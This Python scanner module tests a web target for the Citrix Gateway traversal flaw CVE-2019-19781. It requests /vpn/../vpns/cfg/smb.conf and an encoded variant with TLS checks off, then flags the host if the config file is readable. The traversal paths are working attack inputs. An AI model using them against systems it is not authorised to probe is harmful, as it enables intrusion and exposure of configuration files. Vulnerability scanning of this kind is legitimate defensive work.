import asyncio
from modules.core import console

# Citrix Gateway Scanner (Enterprise RCE)
# Focus: CVE-2019-19781 (Directory Traversal RCE).
# Path: /vpn/../vpns/cfg/smb.conf
# Or: /vpn/../vpns/portal/scripts/newbm.pl

async def check_citrix(session, url):
    try:
        # Standard check for the traversal
        # We try to read smb.conf or just check if endpoint is reachable
        
        # Note: '..' might be normalized by aiohttp/python.
        # We might need to send raw URL or encoded path.
        # /vpn/../vpns/ is effectively /vpns/ 
        
        # The vulnerability specifically relies on the server NOT normalizing before ACL check.
        # So providing /vpn/../vpns/ might be processed as /vpns/ by the handler BUT bypasses ACL on /vpns/ 
        # because the ACL rule is for /vpns/ but request started with /vpn/.
        
        target = f"{url.rstrip('/')}/vpn/../vpns/cfg/smb.conf"
        
        # Some servers block double dot. Try URL encoded: %2e%2e
        target_enc = f"{url.rstrip('/')}/vpn/%2e%2e/vpns/cfg/smb.conf"
        
        targets = [target, target_enc]
        
        for t in targets:
            async with session.get(t, timeout=5, ssl=False) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    if "[global]" in text or "encrypt passwords" in text:
                         return {
                            "url": t,
                            "type": "Citrix RCE (CVE-2019-19781)",
                            "evidence": "Config file smb.conf accessible."
                        }
                elif resp.status == 403:
                    # Might be patched or detected
                    pass

    except Exception:
        pass
    return None

async def scan_citrix(session, url):
    """
    Scan for Citrix Gateway RCE.
    """
    console.print(f"\n[bold cyan]--- Citrix Gateway Scanner ---[/bold cyan]")
    
    results = []
    res = await check_citrix(session, url)
    if res:
         console.print(f"  [bold red][!] CITRIX VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Status: {res['evidence']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No Citrix vulnerabilities found.[/dim]")
        
    return results
